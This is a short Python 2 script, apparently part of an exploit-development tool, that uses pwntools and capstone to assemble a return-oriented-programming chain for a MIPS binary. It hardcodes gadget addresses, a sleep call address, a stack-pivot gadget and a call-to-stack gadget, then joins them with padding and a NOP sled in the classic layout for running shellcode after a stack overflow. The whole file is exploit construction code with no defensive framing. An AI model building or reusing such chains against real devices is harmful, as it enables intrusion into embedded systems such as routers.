#!/usr/bin/env python

import sys
sys.path.append("..")
import pwn
from pwn import *
from capstone import *
from capstone.mips import *


	#raw
"""
nop = "\x22\x51\x44\x44"
gadg_1 = "\x2A\xB3\x7C\x60"
gadg_2 = "\x2A\xB1\x78\x40"
sleep_addr = "\x2a\xb3\x50\x90"
stack_gadg = "\x2A\xAF\x84\xC0"
call_code = "\x2A\xB2\xDC\xF0"
"""

nop = "\\x22\\x51\\x44\\x44"
gadg_1 = "\\x2A\\xB3\\x7C\\x60"
gadg_2 = "\\x2A\\xB1\\x78\\x40"
sleep_addr = "\\x2a\\xb3\\x50\\x90"
stack_gadg = "\\x2A\\xAF\\x84\\xC0"
call_code = "\\x2A\\xB2\\xDC\\xF0"

def GetRopChain(binaryFilePath):
	
	print "\n"

	binary = ELF(binaryFilePath)
	rop = ROP(binaryFilePath)
	print rop.dump()

	#Create Rop with pwntools, but there are many bugs that need to be fixed when porting, for example.
	#Gets whether other controllable registers are determined when returning registers.
	#What algorithm is used to construct the best Rop chain when making gadg block

	#binary.disasm(0x00478584, 16)
	#asm("move $ra,$a0",arch = 'mips', os = 'linux', bits=32)
		
	Rop = gadg_2  + gadg_1 + "B"*0x20 + sleep_addr + "C"*4
	Rop += "C"*0x1c + call_code + "D"*4 + stack_gadg + nop*0x20

	return Rop



